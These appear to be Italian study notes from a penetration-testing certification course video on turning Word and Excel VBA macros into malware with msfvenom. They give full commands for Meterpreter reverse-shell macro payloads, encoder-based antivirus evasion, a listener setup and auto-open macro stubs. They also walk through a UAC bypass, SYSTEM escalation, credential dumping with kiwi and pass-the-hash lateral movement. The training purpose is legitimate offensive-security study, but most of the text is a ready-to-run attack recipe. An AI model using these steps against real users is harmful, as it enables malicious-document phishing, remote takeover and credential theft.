# 014 — Weaponizing VBA Macros with MSF (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 14/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [014_Weaponizing VBA Macros with MSF.txt](014_Weaponizing VBA Macros with MSF.txt) · [014_Weaponizing VBA Macros with MSF.srt](014_Weaponizing VBA Macros with MSF.srt)

## Concetti chiave

- **`msfvenom`** genera payload Meterpreter direttamente in **formato VBA pronto da embeddare** in documenti Office.
- Formati VBA disponibili (`msfvenom --list formats`): **`vba`**, **`vba-exe`**, **`vba-psh`** (PowerShell). I primi due hanno due parti: codice macro + **hex payload da appendere al documento**.
- `vba-exe` è più affidabile su Office recenti rispetto a `vba` nativo.
- L'output `vba-exe` indica `Workbook_Open()` per Excel → **modificare in `Document_Open()`** se si usa Word.
- Sub-routine name **randomizzate ad ogni generazione** = aiuta evasione signature-based.
- **`vba-psh`** = macro autocontenuta con PowerShell encoded → niente hex da appendere, più pulita.
- Encoder `x86/shikata_ga_nai` applicabile con `-e` per evasione AV rudimentale.

## Spiegazione approfondita

### Generazione VBA con `msfvenom` — formato `vba-exe`
```bash
msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.2.134 LPORT=4444 \
  -f vba-exe
```
Output composto da:
1. **Sezione MACRO** — codice VBA da copiare nel VBA IDE (subroutine con nome random tipo `WTSMD12`).
2. **Sezione PAYLOAD DATA** — lungo blob hex da **incollare nel corpo del documento Word**.

> Confusione tipica: i principianti dimenticano la parte 2. Il payload hex DEVE finire nel **documento stesso** (testo), perché la macro lo legge da lì a runtime.

### Adattamento Word vs Excel
`vba-exe` genera `Sub Workbook_Open()` → per **Word** rinominare in `Sub Document_Open()`.

### Generazione VBA-PowerShell (più pulita)
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.2.134 LPORT=4444 \
  -f vba-psh
```
- Output: macro che invoca **PowerShell con comando base64-encoded** che istanzia il meterpreter in-memory.
- **Niente payload hex** da appendere → solo copia/incolla nella sub.
- Funziona indifferentemente con `.doc` o `.docm`.

### Workflow end-to-end
1. Kali: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=… LPORT=4444 -f vba-psh`.
2. Windows + Office: nuovo doc → Developer → Macros → "test" → incolla, rinomina `Workbook_Open` → `Document_Open`.
3. Save As → **Word 97-2003 (.doc)** su Desktop.
4. Kali: setup handler.
5. Vittima apre doc → Enable Content → Meterpreter session.

### Listener
```
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.2.134
msf6 > set LPORT 4444
msf6 > run
```

### Encoding con Shikata Ga Nai
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=… LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 -f vba-psh
```
Aggiunge layer di encoding al payload → meno detection signature-based (NON evade EDR/behavior).

### Post-exploitation dimostrato nel video
- `sysinfo`, `getuid` → user admin ma UAC attivo.
- `load incognito` → `list_tokens -u` (nessun token elevation).
- **Bypass UAC**: `search bypassuac` → `exploit/windows/local/bypassuac_silentcleanup` (o `.dotnet_profiler`) → nuova sessione elevated.
- `getsystem` → SYSTEM.
- `load kiwi` → `creds_all` / `hashdump` → estrazione NTLM.
- Pass-the-Hash: `use exploit/windows/smb/psexec` con `SMBPass=<hash>` (limitato perché Administrator spesso disabilitato).

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `msfvenom --list formats` | Lista format payload supportati |
| `msfvenom -f vba-exe ...` | Macro + payload hex (più affidabile di `vba`) |
| `msfvenom -f vba-psh ...` | Macro PowerShell-based one-shot |
| `-e x86/shikata_ga_nai -i 10` | Encoder poli-iterazione |
| `use exploit/multi/handler` | Listener |
| `bypassuac_silentcleanup` | UAC bypass su Win10 |
| `load incognito` / `impersonate_token` | Token impersonation |
| `load kiwi` + `creds_all` | Estrazione credenziali |
| `exploit/windows/smb/psexec` | Pass-the-Hash lateral movement |

## Esempi pratici

```bash
# Kali — generate payload
msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.2.134 LPORT=4444 \
  -e x86/shikata_ga_nai -i 8 \
  -f vba-psh > macro.vba

# Listener
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/meterpreter/reverse_tcp; \
  set LHOST 192.168.2.134; set LPORT 4444; run"
```

```vba
' Dentro Word, dopo incolla del payload generato:
Sub Document_Open()
    <subroutine_random_name_msf>
End Sub
Sub AutoOpen()
    <subroutine_random_name_msf>
End Sub
```

## Punti d'attenzione per l'esame eCPPT

- **Flag chiave da ricordare**: **`msfvenom -f vba`** / **`-f vba-exe`** / **`-f vba-psh`**.
- `vba-exe` produce DUE pezzi (macro + hex payload). L'hex va incollato **nel body del documento**, non nella macro.
- `vba-psh` è la scelta più pulita: niente hex, payload PowerShell embedded.
- Cambiare **`Workbook_Open` → `Document_Open`** quando target è Word (msfvenom default è Excel).
- Listener: **`exploit/multi/handler`** con payload identico a quello generato.
- Subroutine name randomizzata = piccola assistenza evasion, non sufficiente contro AV moderni (per quello serve obfuscation, vedi MacroPack).
- Bypass UAC tipico Win10: **`bypassuac_silentcleanup`** (parte di domanda su privesc post-initial-access).

## Collegamenti con altri video

- Precedente: [[013_VBA Macro Development - Part 2]]
- Prossimo: [[015_VBA PowerShell Dropper]] — alternativa custom senza Metasploit.
- Reverse shell senza Metasploit: [[016_VBA Reverse Shell Macro with Powercat]]
- Obfuscation/automation: [[021_Automating Macro Development with MacroPack - Part 1]]
- Privesc post-shell: modulo **Privilege Escalation** (`bypassuac_*`, token impersonation).
